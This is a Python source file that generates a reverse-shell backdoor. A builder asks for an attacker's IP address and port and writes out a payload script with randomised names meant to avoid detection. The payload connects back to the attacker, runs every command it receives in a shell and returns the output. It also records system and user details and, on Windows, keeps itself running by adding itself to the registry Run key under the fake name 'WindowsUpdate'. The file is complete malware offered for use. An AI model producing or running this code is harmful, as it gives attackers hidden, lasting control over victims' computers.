import os
import random
import string

def generate_payload(attacker_ip, attacker_port):
    # Generate random variable names to avoid detection
    var1 = ''.join(random.choices(string.ascii_lowercase, k=8))
    var2 = ''.join(random.choices(string.ascii_lowercase, k=8))
    var3 = ''.join(random.choices(string.ascii_lowercase, k=8))
    
    payload_template = f'''
import os
import socket
import subprocess
import platform
import getpass
import threading
import time

{var1} = "{attacker_ip}"
{var2} = {attacker_port}

def {var3}():
    try:
        {var1}_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        {var1}_conn.connect(({var1}, {var2}))
        
        while True:
            cmd = {var1}_conn.recv(1024).decode()
            if cmd.lower() == 'exit':
                break
            
            output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            result = output.stdout + output.stderr
            {var1}_conn.send(result.encode())
            
        {var1}_conn.close()
    except:
        pass

def collect_info():
    info = []
    info.append(f"System: {{platform.system()}}")
    info.append(f"User: {{getpass.getuser()}}")
    info.append(f"Hostname: {{platform.node()}}")
    return "\\\\n".join(info)

def persistence():
    if platform.system() == "Windows":
        import winreg
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
            reg_key = winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, __file__)
            winreg.CloseKey(reg_key)
        except:
            pass

if __name__ == "__main__":
    persistence()
    info = collect_info()
    with open("sysinfo.txt", "w") as f:
        f.write(info)
    
    while True:
        try:
            {var3}()
        except:
            time.sleep(60)
'''

    return payload_template

def build_payload():
    attacker_ip = input("Enter attacker IP: ")
    attacker_port = int(input("Enter attacker port: "))
    output_file = input("Enter output filename (e.g., payload.py): ")
    
    payload_code = generate_payload(attacker_ip, attacker_port)
    
    with open(output_file, 'w') as f:
        f.write(payload_code)
    
    print(f"Payload successfully built as {output_file}")

if __name__ == "__main__":
    build_payload()
